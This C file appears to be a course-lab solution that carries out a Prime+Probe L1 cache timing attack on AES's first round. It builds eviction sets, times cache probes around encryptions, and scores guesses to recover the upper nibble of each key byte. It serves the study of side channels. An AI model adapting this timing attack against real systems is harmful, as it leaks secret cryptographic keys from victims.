#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>

#include "solution.h"
#include "../../material/AES/aes.h"

/* Reuse eviction-set construction from task2, but local to this file */

typedef struct node {
    struct node *next;
    uint8_t      padding[56];
} node_t;

static uint8_t *g_region      = NULL;
static size_t   g_region_size = 0;
static node_t  *g_sets[L1_SETS];

static inline int l1_set_from_addr(void *addr) {
    uintptr_t a = (uintptr_t)addr;
    return (int)((a >> 6) & 0x3f);
}

static int init_eviction_sets(void) {
    if (g_region != NULL) {
        return 0;
    }

    g_region_size = 4 * 1024 * 1024;
    g_region = mmap(NULL, g_region_size,
                    PROT_READ | PROT_WRITE,
                    MAP_PRIVATE | MAP_ANONYMOUS,
                    -1, 0);
    if (g_region == MAP_FAILED) {
        perror("mmap");
        g_region = NULL;
        return -1;
    }

    node_t *tmp[L1_SETS][L1_ASSOC];
    int counts[L1_SETS] = {0};

    for (size_t off = 0; off + L1_LINE <= g_region_size; off += L1_LINE) {
        node_t *n = (node_t *)(g_region + off);
        int set = l1_set_from_addr(n);
        if (set < 0 || set >= L1_SETS) {
            continue;
        }
        if (counts[set] < L1_ASSOC) {
            tmp[set][counts[set]++] = n;
        }
    }

    for (int s = 0; s < L1_SETS; s++) {
        if (counts[s] < L1_ASSOC) {
            fprintf(stderr, "Not enough lines for set %d\n", s);
            return -1;
        }
        for (int i = 0; i < L1_ASSOC; i++) {
            tmp[s][i]->next = tmp[s][(i + 1) % L1_ASSOC];
        }
        g_sets[s] = tmp[s][0];
    }

    return 0;
}

static void prime_all_sets(void) {
    for (int s = 0; s < L1_SETS; s++) {
        volatile node_t *p = g_sets[s];
        for (int i = 0; i < L1_ASSOC; i++) {
            p = p->next;
        }
    }
}

static void probe_all_sets(uint64_t *times_out) {
    for (int s = 0; s < L1_SETS; s++) {
        volatile node_t *p = g_sets[s];
        uint64_t start, end;

        asm volatile("lfence" ::: "memory");
        start = rdtsc64();
        for (int i = 0; i < L1_ASSOC; i++) {
            p = p->next;
        }
        end = rdtsc64();
        asm volatile("lfence" ::: "memory");

        times_out[s] = end - start;
    }
}

void task3_attack_first_round(int samples, const uint8_t key[16],
                              uint8_t out_upper_nibbles[16]) {
    if (init_eviction_sets() != 0) {
        fprintf(stderr, "Failed to initialize eviction sets\n");
        return;
    }

    AES_KEY aeskey;
    if (private_AES_set_encrypt_key(key, 128, &aeskey) != 0) {
        fprintf(stderr, "private_AES_set_encrypt_key failed\n");
        return;
    }

    /* accum[byte][plaintext_upper_nibble][set] */
    static double   accum[16][16][L1_SETS];
    static uint32_t counts[16][16];

    memset(accum, 0, sizeof(accum));
    memset(counts, 0, sizeof(counts));

    uint8_t pt[16];
    uint8_t ct[16];
    uint64_t times[L1_SETS];

    for (int sample = 0; sample < samples; sample++) {
        for (int i = 0; i < 16; i++) {
            pt[i] = (uint8_t)(rand() & 0xff);
        }

        prime_all_sets();
        AES_encrypt(pt, ct, &aeskey);
        probe_all_sets(times);

        for (int j = 0; j < 16; j++) {
            int p4 = pt[j] >> 4; /* upper 4 bits */
            counts[j][p4]++;
            for (int s = 0; s < L1_SETS; s++) {
                accum[j][p4][s] += (double)times[s];
            }
        }
    }

    /* Normalisation */
    double global_mean[16][L1_SETS];
    double norm[16][16][L1_SETS];

    for (int j = 0; j < 16; j++) {
        for (int s = 0; s < L1_SETS; s++) {
            double sum = 0.0;
            uint32_t cnt = 0;
            for (int p4 = 0; p4 < 16; p4++) {
                sum += accum[j][p4][s];
                cnt += counts[j][p4];
            }
            global_mean[j][s] = sum / (double)cnt;
        }
    }

    for (int j = 0; j < 16; j++) {
        for (int p4 = 0; p4 < 16; p4++) {
            for (int s = 0; s < L1_SETS; s++) {
                double mean = accum[j][p4][s] / (double)counts[j][p4];
                norm[j][p4][s] = mean - global_mean[j][s];
            }
        }
    }

    /* Scoring upper nibble guesses */
    for (int j = 0; j < 16; j++) {
        double best_score = -1e300;
        int best_g = 0;

        for (int g = 0; g < 16; g++) {
            for (int off = 0; off < L1_SETS; off++) {
                double sum = 0.0;

                for (int p4 = 0; p4 < 16; p4++) {
                    int x = ((p4 << 4) ^ (g << 4)); /* plaintext^key upper nibble */
                    int line = x >> 4; /* 0..15 */
                    int set  = (off + line) & (L1_SETS - 1);
                    sum += norm[j][p4][set];
                }

                if (sum > best_score) {
                    best_score = sum;
                    best_g = g;
                }
            }
        }

        out_upper_nibbles[j] = (uint8_t)best_g;
    }
}
